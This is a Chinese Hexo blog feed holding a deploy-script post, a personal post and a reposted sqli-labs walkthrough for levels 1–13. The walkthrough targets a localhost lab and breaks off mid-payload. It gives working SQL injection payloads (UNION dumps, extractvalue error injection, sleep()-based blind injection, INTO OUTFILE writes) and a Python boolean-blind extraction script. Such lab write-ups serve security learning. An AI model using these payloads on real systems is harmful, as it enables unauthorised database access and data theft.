<span class="hljs-built_in">exit</span><br><span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;该项目路径不存在&quot;</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;End&quot;</span><br>        <span class="hljs-built_in">exit</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><h2 id="问题所在"><a href="#问题所在" class="headerlink" title="问题所在"></a>问题所在</h2><p>1.判断是否存在git目录，再生成gittmp目录我感觉没有很大必要，可能这能省一点时间和cpu，有点鸡肋。</p><p>2.拉取最新文件所使用的代码是强制覆盖本地(即服务器)代码。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">git <span class="hljs-keyword">fetch</span> <span class="hljs-comment">--all</span><br>git <span class="hljs-keyword">reset</span> <span class="hljs-comment">--hard origin/master</span><br>git pull<br></code></pre></td></tr></table></figure><p>但由于我用的腾讯云+宝塔面板会自动在网站根目录生成.usr.ini文件，防止跨站攻击啥的。如果使用<code>git init</code>需要此目录全空，不能有隐藏文件，所以要先删除，删除后再<code>git pull</code>就可以获取github或者码云上的仓库代码了。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">chattr -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-class">.user</span><span class="hljs-selector-class">.ini</span><br>chmod -R <span class="hljs-number">777</span> <span class="hljs-selector-class">.user</span><span class="hljs-selector-class">.ini</span><br>rm -rf <span class="hljs-selector-class">.user</span>.ini<br></code></pre></td></tr></table></figure><p>之后再<code>git init</code> + <code>git pull</code>就可以了</p><h2 id="改后代码"><a href="#改后代码" class="headerlink" title="改后代码"></a>改后代码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-comment"># 输出当前时间</span><br><span class="hljs-built_in">date</span> --<span class="hljs-built_in">date</span>=<span class="hljs-string">&#x27;0 days ago&#x27;</span> <span class="hljs-string">&quot;+%Y-%m-%d %H:%M:%S&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Start&quot;</span><br><span class="hljs-comment"># git项目路径</span><br>gitPath=<span class="hljs-string">&quot;/www/wwwroot/gofervor.com&quot;</span><br><span class="hljs-comment"># git 网址</span><br>gitHttp=<span class="hljs-string">&quot;git@gitee.com:chen-yuhong6/hexo.git&quot;</span><br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Web站点路径：<span class="hljs-variable">$gitPath</span>&quot;</span><br><br><span class="hljs-comment"># 判断项目路径是否存在</span><br><span class="hljs-keyword">if</span> [ -d <span class="hljs-string">&quot;<span class="hljs-variable">$gitPath</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">cd</span> <span class="hljs-variable">$gitPath</span><br>        <span class="hljs-built_in">rm</span> -rf *<br>        <span class="hljs-comment"># 拉取最新的项目文件</span><br>        chattr -i .user.ini<br><span class="hljs-built_in">chmod</span> -R 777 .user.ini<br> <span class="hljs-built_in">rm</span> -rf .user.ini<br>        <span class="hljs-built_in">rm</span> -rf .git<br>        git init<br>        git pull git@gitee.com:chen-yuhong6/hexo.git        //这个改一下，别pull我的仓库<br>        <span class="hljs-comment"># 设置目录权限</span><br>        <span class="hljs-built_in">chown</span> -R www:www <span class="hljs-variable">$gitPath</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;End&quot;</span><br>        <span class="hljs-built_in">exit</span><br><span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;该项目路径不存在&quot;</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;End&quot;</span><br>        <span class="hljs-built_in">exit</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>像设置webhook啥的网上一大堆，百度就可以了。<br/><br>我认为百度上有个错误的说法，即原官方代码中的$1必须和仓库名和域名一致，我的就没有，但现在还能使。</p><h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><p>在本地git命令<code>hexo new article</code>后写完md文章。<br/><br>然后<code>hexo clean &amp;&amp; hexo g -d</code>后上传至仓库，仓库就能自动上传到服务器，进入网站就能看见新写的article了，不用手动上传到服务器了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>技术分享</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>first blog of 地板砖b1ub1u</title>
    <link href="/2022/02/23/first%20blog%20of%20%E5%9C%B0%E6%9D%BF%E7%A0%96b1ub1u/"/>
    <url>/2022/02/23/first%20blog%20of%20%E5%9C%B0%E6%9D%BF%E7%A0%96b1ub1u/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><em><strong>假期制定了不少plan，因为这事那事…….<br/>总之，因为lan，我的假期plan就剩个p了</strong></em></p><br/><h1 id="杂谈"><a href="#杂谈" class="headerlink" title="杂谈"></a>杂谈</h1><h2 id="建站"><a href="#建站" class="headerlink" title="建站"></a>建站</h2><p>服务器买的腾讯云的，后来感觉果然不如买国外的，之后域名图方便也是从腾讯云下的dnspod买的，审核过了之后差不多就能配置着用了，大概花了半个月左右的时间。2021年底理论上就能用了。</p><p>但是下了个简单的wordpress就没咋玩了，除了当时玩log4j漏洞jndi注入用了一下vps。(虽然不知道原理，就纯粹瞎跟着做<br/></p><p>最近看hexo框架的博客很好看哎，就想着换一下，之后写点东西都更这上面。没想到是个天坑…..好看是好看，部署比较麻烦，本地的源码先pull到github上，github再导到服务器上。网上用自动化部署github actions(这个对于没有个人域名和vps的比较友好，我感觉有点鸡肋)，Travis CI(自动化集成的，最近几年在收费，绝对不可能用的)，Netlify(相当于免费的CI，但我没搞成功，啧，从github建二级域名的时候一直failed)，服务器建个js脚本配合pm2跟github的webhooks(我也失败了)，宝塔webhook v1.2(这个最离谱，配合github的webhooks能成功链接，但response都是让登录宝塔界面，根本到不了宝塔webhook软件页面)。</p><p>最后我只能手动启动宝塔webhook，焯！</p><h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><p>我准备最近先把sqli-labs过完，把sql注入学透了再看看其他的，别省赛的常规题都做不出来，所以之后应该先更sqli的wp了，应该会写的很细致</p><h2 id="学业"><a href="#学业" class="headerlink" title="学业"></a>学业</h2><p>虽然但是，我也很痛心的感觉到gpa和ctf似乎不能共存，太难了，不知道这学期绩点会咋样，全是难的要死的课。</p><h2 id="以后"><a href="#以后" class="headerlink" title="以后"></a>以后</h2><p>不过我个人还是偏喜欢安全方面多一些的，不太喜欢学校信管的课程，但java，数据结构，操作系统，计网啥的也得好好学啊，刘神tql。之后想把web学学之后等大三后或者大四看看二进制安全，学学pwn</p><br/><hr><p><em>ps：对了，hexo只能用 md文件部署，真无语。一点也不熟悉，之前db让用 md写 java实验报告都是抄的，哪有自己写markdown</em></p>]]></content>
    
    
    
    <tags>
      
      <tag>个人</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>(转载)sqli-labs 通关笔记</title>
    <link href="/2022/01/21/(%E8%BD%AC%E8%BD%BD%E5%AD%A6%E4%B9%A0)sqli-lab/"/>
    <url>/2022/01/21/(%E8%BD%AC%E8%BD%BD%E5%AD%A6%E4%B9%A0)sqli-lab/</url>
    
    <content type="html"><![CDATA[<p>转载链接：<a href="https://inhann.top/2021/01/21/sqli-lab/">https://inhann.top/2021/01/21/sqli-lab/</a><br>[toc]</p><blockquote><p>菜鸡不会sqli，所以练练，就把sqli-labs刷完了，这里记录一下每一题的大体思路和payload</p></blockquote><blockquote><p>文末小结里有sqli一些知识点的思维导图，有需要可自取</p></blockquote><h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost:<span class="hljs-number">12345</span>/Less-<span class="hljs-number">1</span>/?id=&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p>可以</p><p>目的是得到所有字段的数据</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost:<span class="hljs-number">12345</span>/Less-<span class="hljs-number">1</span>/?id=&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p>直接union select 得到字段位置</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/testblog/2021/01/image-20210119143315969.png" alt="image-20210119143315969"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost:<span class="hljs-number">12345</span>/Less-<span class="hljs-number">1</span>/?id=&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=database()%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p>得到所有表命名</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/testblog/2021/01/image-20210119143638242.png" alt="image-20210119143638242"></p><p>差不多了</p><h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p>id 是 numeric value</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/testblog/2021/01/image-20210119143901007.png" alt="image-20210119143901007"></p><p>差不多了</p><h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost:<span class="hljs-number">12345</span>/Less-<span class="hljs-number">3</span>/?id=<span class="hljs-number">1</span> order by <span class="hljs-number">5</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p>无论order by 多少，都没用，这里可能是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">where id = (<span class="hljs-string">&#x27;input&#x27;</span>)<br></code></pre></td></tr></table></figure><p>并且id的类型为var char</p><p>所以<code>1 order by 5%23</code> 会被当做string，从而转换成1处理</p><p>这样就行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost:<span class="hljs-number">12345</span>/Less-<span class="hljs-number">3</span>/?id=&#x27;) union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119145440060.png" alt="image-20210119145440060"></p><p>完成了绕过</p><h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>尝试单引号没有报错</p><p>但是尝试双引号就报错了</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119145732828.png" alt="image-20210119145732828"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">where id = (<span class="hljs-string">&quot;<span class="hljs-subst">$a</span> = <span class="hljs-subst">$_GET</span>[&#x27;id&#x27;]&quot;</span>)<br></code></pre></td></tr></table></figure><p>而且还有个括号要绕过</p><p>所以是这样</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">12345</span><span class="hljs-regexp">/Less-4/</span>?id=<span class="hljs-number">0</span><span class="hljs-string">&quot;) union select 1,2,3%23</span><br></code></pre></td></tr></table></figure><p>差不多</p><h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><p>用 <code>&#39;</code> 发现报错</p><p>猜测</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-string">&#x27;input&#x27;</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>但是这里成功会返回You are in ，失败会报错</p><p>即select 的信息不回回显</p><p>那咋办呢</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119150621876.png" alt="image-20210119150621876"></p><p>报错注入，可以得到一些基本信息</p><p>写盲注脚本，虽然跑脚本比较费时间，但是几乎所有信息都可以获得</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost:<span class="hljs-number">12345</span>/Less-<span class="hljs-number">5</span>/?id=<span class="hljs-number">1</span>&#x27; and (extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select database()),<span class="hljs-number">0</span>x7e)))%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BoolSqlier</span>:<br>    url = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,database=<span class="hljs-string">&quot;&quot;</span></span>):<br>        self.database = database<br>        self.url = BoolSqlier.url<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_database</span>(<span class="hljs-params">self</span>):<br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">send_request</span>(<span class="hljs-params">i,mid</span>):<br><br>            payload = <span class="hljs-string">&quot;1&#x27;and(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            params = &#123;<span class="hljs-string">&quot;id&quot;</span>:payload&#125;<br>            resp = requests.get(self.url,params=params)<br>            <span class="hljs-keyword">return</span> resp<br>            <br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">database_i_ascii_bt_mid</span>(<span class="hljs-params">resp</span>):<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;You are in...........&quot;</span> <span class="hljs-keyword">in</span> resp.text:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">else</span>: <br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        database=<span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br>            <span class="hljs-comment">#head 和 tail 决定了database的字符的取值范围</span><br>            head=<span class="hljs-number">32</span>         <br>            tail=<span class="hljs-number">127</span><br>            <span class="hljs-keyword">while</span> head&lt;tail:<br>                mid=(head+tail)&gt;&gt;<span class="hljs-number">1</span><br>                resp = send_request(i,mid)<br>               <br>                <span class="hljs-keyword">if</span> database_i_ascii_bt_mid(resp):<br>                    head=mid+<span class="hljs-number">1</span><br>                <span class="hljs-keyword">else</span>:<br>                    tail=mid<br>            <span class="hljs-keyword">if</span>(head!=<span class="hljs-number">32</span>):<br>                database+=<span class="hljs-built_in">chr</span>(head)<br>                <span class="hljs-built_in">print</span>(database)<br>        self.database = database<br>        <span class="hljs-built_in">print</span>(database)<br>    <br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    BoolSqlier.url = <span class="hljs-string">&quot;http://localhost:12345/Less-5/&quot;</span><br>    sqli = BoolSqlier()<br>    sqli.get_database()<br></code></pre></td></tr></table></figure><p>差不多了</p><h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><p>单引号不会报错</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119182324267.png" alt="image-20210119182324267"></p><p>原因可能是</p><ul><li>用的双引号</li><li>addslashes</li></ul><p>暂时不确定有没有用到括号</p><p>试一下双引号</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119182820731.png" alt="image-20210119182820731"></p><p>报错了</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">12345</span><span class="hljs-regexp">/Less-6/</span>?id=<span class="hljs-number">1</span><span class="hljs-string">&quot;%23</span><br></code></pre></td></tr></table></figure><p>可以</p><p>说明没有括号()</p><p>剩下的就是报错注入注基本信息，布尔盲注注具体字段信息了</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">12345</span><span class="hljs-regexp">/Less-6/</span>?id=<span class="hljs-number">1</span><span class="hljs-string">&quot; and (extractvalue(1,concat(0x7e,(select database()),0x7e)))%23</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119183035689.png" alt="image-20210119183035689"></p><h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119185034862.png" alt="image-20210119185034862"></p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">You are <span class="hljs-keyword">in</span><span class="hljs-params">...</span>. Use outfile<span class="hljs-params">...</span><span class="hljs-params">...</span><br></code></pre></td></tr></table></figure><p>要往外写文件</p><p><code>?id=1&#39;</code> 报错</p><p><code>?id=1&#39;%23</code> 报错</p><p>都是 <code>You have an error in your SQL syntax</code></p><p>闭合处出现 syntax error，一般考虑三个</p><ul><li>‘</li><li>“</li><li>)</li><li>多个 )</li></ul><p>那就试试看括号</p><p><code>?id=1&#39;)%23</code> syntax error</p><p>但是两个括号，就成了</p><p><code>?id=1&#39;))%23</code></p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119185602815.png" alt="image-20210119185602815"></p><p>接下来就是outfile了</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">?id=<span class="hljs-number">1</span>&#x27;)) <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p>没问题，是三个</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;)) UNION SELECT <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;hello.txt&quot;</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h2><p>‘ 没有信息了，估计报错了，但是报错信息不返回</p><p><code>?id=1&#39;%23</code>  就又行了</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119191613590.png" alt="image-20210119191613590"></p><p>但是还是没有回显select的内容</p><p>看来只能盲注</p><p>先试试看有没有过滤什么的</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?id=<span class="hljs-number">1</span>&#x27; and ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">0</span><span class="hljs-comment">%23</span><br></code></pre></td></tr></table></figure><p>没有错，说明能用</p><p>而很大程度上，有这个就够了，就能注出所有东西</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> ascii(substr((select group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()),1,1))&gt;80%23<br></code></pre></td></tr></table></figure><h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h2><p>感觉好像无论输入什么，返回的都是 You are in……</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119195158190.png" alt="image-20210119195158190"></p><p>没办法</p><p>只能用时间盲注</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost:<span class="hljs-number">12345</span>/Less-<span class="hljs-number">9</span>/?id=<span class="hljs-number">1</span>&#x27; and If(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">115</span>,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>))%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p>而且，我的firefox会一卡一卡的，所以要换个浏览器，不然对判断会有很大的影响</p><h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h2><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119195623611.png" alt="image-20210119195623611"></p><p>貌似又要盲注</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119195734373.png" alt="image-20210119195734373"></p><p>而且是时间盲注</p><h2 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h2><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119195816927.png" alt="image-20210119195816927"></p><p>不一样了，要输入的有两个东西</p><p>抓包看一看，是POST，传入的是username和passwd</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119195937251.png" alt="image-20210119195937251"></p><p>尝试一下 加 ‘</p><p>发现两个参数都有报错，说明都可以是注入点</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119200153496.png" alt="image-20210119200153496"></p><p>不知道这两个参数是用在同一个还是不同的sql语句里面，可以试试看</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">uname</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27;%23&amp;passwd=hello&#x27;</span>&amp;submit=Submit<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119200723374.png" alt="image-20210119200723374"></p><p>说明passwd和uname在同一个语句中，且passwd在后面，所以被注释掉了，没有报错</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=<span class="hljs-number">1</span>&#x27; order by <span class="hljs-number">1</span>,<span class="hljs-number">2</span>%<span class="hljs-number">23</span>&amp;passwd=hello&#x27;&amp;submit=Submit<br></code></pre></td></tr></table></figure><p>order by 2可以，order by 3不行</p><p>所以很明显了</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>%<span class="hljs-number">23</span>&amp;passwd=hello&#x27;&amp;submit=Submit<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119200951582.png" alt="image-20210119200951582"></p><p>结果有回显</p><p>而且没什么过滤，那就随便整了</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">uname=<span class="hljs-number">1&#x27;</span> <span class="hljs-function">union <span class="hljs-keyword">select</span> <span class="hljs-title">database</span>(),<span class="hljs-title">group_concat</span>(<span class="hljs-params">table_name</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema</span>=database()%<span class="hljs-number">23</span>&amp;passwd=hello<span class="hljs-string">&#x27;&amp;submit=Submit</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119201146925.png" alt="image-20210119201146925"></p><p>没问题</p><h2 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h2><p>还是两个输入</p><p>‘ 没报错</p><p>“ 报错</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119201407977.png" alt="image-20210119201407977"></p><p><code>1&quot;%23</code> 还是报错syntax error</p><p>说明还没闭合好，加个)</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">uname</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&quot;)%23&amp;passwd=1&amp;submit=Submit</span><br></code></pre></td></tr></table></figure><p>可以了</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=1&quot;) union select 1,2%23&amp;<span class="hljs-attribute">passwd</span>=1&amp;submit=Submit<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119201826130.png" alt="image-20210119201826130"></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">uname=1&quot;) union <span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>(),group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()%<span class="hljs-number">23</span>&amp;passwd=<span class="hljs-number">1</span>&amp;submit=Submit<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119201940984.png" alt="image-20210119201940984"></p><p>没问题</p><h2 id="les-13"><a href="#les-13" class="headerlink" title="les-13"></a>les-13</h2><p>两个输入</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=<span class="hljs-number">1</span>&#x27;)%<span class="hljs-number">23</span>&amp;passwd=<span class="hljs-number">1</span>&amp;submit=Submit<br></code></pre></td></tr></table></figure><p>没问题</p><p>会报错，但是select的不会回显</p><p>所以就只能用报错注入，或者盲注</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=<span class="hljs-number">1</span>&#x27;) and 